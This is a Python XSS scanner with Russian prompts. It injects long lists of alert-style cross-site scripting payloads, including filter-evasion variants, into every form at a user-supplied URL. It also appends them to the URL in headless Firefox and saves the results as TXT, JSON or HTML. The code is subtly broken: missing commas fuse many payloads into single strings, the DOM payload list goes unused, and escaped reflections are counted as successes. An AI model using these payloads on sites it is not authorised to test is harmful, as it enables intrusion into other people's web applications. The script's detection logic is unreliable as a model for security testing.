import datetime
import urllib.parse
import requests
import html
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import webbrowser
import os
import random
from bs4 import BeautifulSoup

resultjson = []

filename = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"

folder_path = "results"

os.makedirs(folder_path, exist_ok=True)

file_path = os.path.join(folder_path, filename)

dom_payload = [
    "<script>alert(1)</script>"
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    "><script>alert(1)</script>"
    "><img src=x onerror=alert(1)>"
    "javascript:alert(1)"
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    "#<img src=x onerror=alert(1337)>",
    "#<svg onload=alert(1337)>",
    "#<body onload=alert(1337)>",
    "?q=<script>alert(1337)</script>",
    "#<iframe src='javascript:alert(1337)'>"
]

payloads = [
    "<script>alert(1)</script>"
    "><script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg/onload=alert(1)>"
    "<iframe src=\"javascript:alert(1)\"></iframe>"
    "<details open ontoggle=alert(1)>"
    "<scr<script>ipt>alert(1)</scr</script>ipt>"
    "<scr\0ipt>alert(1)</scr\0ipt>"
    "<svg><script xlink:href=javascript:alert(1)> </script></svg>"
    "<img src=\"x\" onerror=confirm`XSS`>"
    "<math href=\"javascript:alert(1)\">CLICK</math>"
    "<body onload=alert(1)>"
    "<video><source onerror=\"alert(1)\"></video>"
    "\" onmouseover=\"alert(1)"
    "' onfocus='alert(1)"
    "<INPUT TYPE=\"IMAGE\" SRC=\"x\" ONERROR=\"alert(1)\">"
    "<marquee onstart=alert(1)>"
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>"
    "<embed src=\"data:image/svg+xml;base64,...\">"
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>"
    "<isindex onfocus=alert(1)>"
    "<keygen autofocus onfocus=alert(1)>"
    "<svg><a xlink:href=\"javascript:alert(1)\">CLICK</a></svg>"
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
    "<math><mi xlink:href=\"javascript:alert(1)\">X</mi></math>"
    "<img src=x onerror=alert(1)>"
    "<script>alert(1)</script>"
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>",
    "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror='alert(1)'></video>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<math><mtext><img src=x onerror=alert(1)></mtext></math>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<script/src=data:text/javascript,alert(1)>",
    "<svg><script xlink:href=data:,alert(1)></script></svg>",
    "<img ''='' onerror=alert(1)>",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<a href=JaVaScRiPt:alert(1)>click</a>",
    "<script>/*--><script>alert(1)//--></script>",
    "<script>eval('alert(1)')</script>",
    "<script>prompt(1337)</script>",
    "<script>confirm('XSS')</script>",
    "<img src=1 onerror=eval('alert(1)')>",
    "<script>Function('alert(1)')()</script>"
]

user_agents = [
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 YaBrowser/20.9.3.136 Yowser/2.5 Safari/537.36"
	"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4298.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36", 
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061121 BonEcho/2.",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4pre) Gecko/20070410 BonEcho/2.0.0.4pre",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20060930 BonEcho/2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070213 BonEcho/2.0.0.2pre",
    "Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.4463.1220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.176"
]

headers = {
    "User-Agent": random.choice(user_agents),
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1"
}

def vibor():
    print("\nВыбери формат сохранения результата\n1-TXT\n2-JSON\n3-HTML")
    choice = input(": ").strip()
    return choice

def scan_form_xss(base_url, payloads, resultjson):
    print("\nПроверка XSS через формы:")

    try:
        response = requests.get(base_url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        print(f"Найдено форм: {len(forms)}")

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            full_url = urllib.parse.urljoin(base_url, action)

            inputs = form.find_all(["input", "textarea", "select"])
            input_names = [i.get("name") for i in inputs if i.get("name")]

            if not input_names:
                continue

            for payload in payloads:
                data = {name: payload for name in input_names}

                try:
                    if method == "post":
                        form_response = requests.post(full_url, data=data, headers=headers, timeout=10)
                    else:
                        form_response = requests.get(full_url, params=data, headers=headers, timeout=10)

                    raw = payload in form_response.text
                    escaped = html.escape(payload) in form_response.text
                    worked = raw or escaped
                    status = "отражён как есть" if raw else "экранирован" if escaped else "не отражён"

                    print(f"{'сработал' if worked else 'не сработал'} ({status}) {payload} -> {full_url}")

                    resultjson.append({
                        "payload": payload,
                        "worked": worked,
                        "url": full_url,
                        "method": method.upper(),
                        "status_code": form_response.status_code,
                        "via": "form"
                    })

                except Exception as e:
                    print(f"[!] Ошибка при отправке формы: {e}")

    except Exception as e:
        print(f"[!] Ошибка при анализе формы: {e}")


def test_dom_xss(base_url, payloads, resultjson):
    print("\nПроверка на DOM-based XSS (Selenium):")
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options=options)

    for payload in payloads:
        try:
            full_url = base_url + payload
            driver.get(full_url)
            alert = False
            try:
                alert_obj = driver.switch_to.alert
                alert_obj.accept()
                alert = True
            except:
                pass

            print(f"{'[+] сработал' if alert else 'не сработал'} {payload}")

            result_entry = {
                "payload": payload,
                "worked": alert,
                "url": full_url,
                "status_code": "N/A (DOM)"
            }
            resultjson.append(result_entry)

        except Exception as e:
            print(f"ошибка DOM XSS: {e}")

    driver.quit()

save_format = vibor()

method = input("Выбери метод запроса (GET или POST): ").strip().upper()
if method not in ["GET", "POST"]:
    print("Неверный метод. По умолчанию используется GET.")
    method = "GET"

url = input("Введите url (например, https://example.com): ").strip()

scan_form_xss(url, payloads, resultjson)

test_dom_xss(url, payloads, resultjson)

if save_format == "1":
    with open(os.path.join(folder_path, f"{filename}.txt"), "w", encoding="utf-8") as f:
        for entry in resultjson:
            f.write(f"{'сработал' if entry['worked'] else 'не сработал'} {entry['payload']}\n")

elif save_format == "2":
    with open(f"{folder_path}/{filename}.json", "w", encoding="utf-8") as f:
        json.dump(resultjson, f, ensure_ascii=False, indent=4)


elif save_format == "3":
    html_content = """
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <title>Результаты XSS</title>
            <style>
                body { font-family: sans-serif; background: #f9f9f9; padding: 20px; }
                table { border-collapse: collapse; width: 100%; background: white; }
                th, td { border: 1px solid #ddd; padding: 8px; }
                th { background: #222; color: white; }
                tr:nth-child(even) { background: #f2f2f2; }
                code { color: #c7254e; background: #f9f2f4; padding: 2px 4px; border-radius: 4px; }
            </style>
        </head>
        <body>
            <h1>Результаты XSS</h1>
            <table>
                <tr>
                    <th>Payload</th>
                    <th>URL</th>
                    <th>Сработал?</th>
                    <th>Status Code</th>
                </tr>
    """

    for entry in resultjson:
        safe_payload = html.escape(entry["payload"])
        safe_url = html.escape(entry["url"])
        html_content += f"""
                <tr>
                    <td><code>{safe_payload}</code></td>
                    <td><a href="{safe_url}">{safe_url}</a></td>
                    <td>{"Да" if entry["worked"] else "Нет"}</td>
                    <td>{entry["status_code"]}</td>
                </tr>
        """

    html_content += """
            </table>
        </body>
        </html>
    """

    browser = input("Хотите сразу открыть HTML-отчёт в браузере? (y/n): ")

    html_file = os.path.join(folder_path, f"{filename}.html")

    with open(html_file, "w", encoding="utf-8") as hf:
        hf.write(html_content)

    if browser == "y":
        webbrowser.open(html_file)
